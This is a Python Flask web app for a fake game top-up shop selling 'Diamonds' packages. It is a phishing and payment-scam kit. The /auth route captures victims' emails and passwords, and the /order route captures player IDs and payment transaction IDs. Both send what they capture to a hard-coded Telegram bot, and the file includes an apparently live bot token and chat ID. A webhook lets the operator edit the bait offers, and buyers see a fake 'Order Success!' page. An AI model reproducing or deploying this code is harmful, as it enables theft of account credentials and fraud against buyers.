from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)
T = '8567544194:AAHbkTbjnkTsN2iNznlN5Ek1TtlN_R0ncTE'
C = '8691740167'

offers = [
    {"name": "25 Diamonds", "price": "17"},
    {"name": "50 Diamonds", "price": "31"},
    {"name": "100 Diamonds", "price": "67"},
    {"name": "Weekly Lite", "price": "145"}
]

def send(m):
    requests.post(f"https://api.telegram.org/bot{T}/sendMessage", data={'chat_id': C, 'text': m, 'parse_mode': 'Markdown'})

@app.route('/')
def index():
    return render_template('index.html', offers=offers)

@app.route('/tg_webhook', methods=['POST'])
def webhook():
    data = request.json
    if "message" in data:
        msg = data["message"].get("text", "")
        global offers
        if msg.startswith("/add"):
            try:
                p = msg.split(" ", 1)[1].split(",")
                offers.append({"name": p[0].strip(), "price": p[1].strip()})
                send(f"✅ Added: {p[0]}")
            except: send("❌ Use: `/add Name,Price`")
        elif msg.startswith("/del"):
            n = msg.split(" ", 1)[1].strip()
            offers = [o for o in offers if o["name"] != n]
            send(f"🗑️ Deleted: {n}")
        elif msg == "/list":
            l = "\n".join([f"🔹 {o['name']} - {o['price']} TK" for o in offers])
            send(f"📦 *Offers:*\n{l}")
    return "OK"

@app.route('/auth', methods=['POST'])
def auth():
    e, p, t = request.form.get('email'), request.form.get('password'), request.form.get('type')
    send(f"👤 *NEW {t}*\n📧 Email: `{e}`\n🔑 Pass: `{p}`")
    return "OK"

@app.route('/order', methods=['POST'])
def order():
    u, pk, m, tx = request.form.get('player_id'), request.form.get('package'), request.form.get('payment_method'), request.form.get('trx_id')
    send(f"🔔 *NEW ORDER*\n👤 UID: `{u}`\n💎 Pack: {pk}\n💳 Method: {m}\n🔑 TrxID: `{tx}`")
    return '<body style="background:#000;color:#fff;text-align:center;padding-top:100px;"><h1>Order Success!</h1><a href="/" style="color:#4169e1;">Back</a></body>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
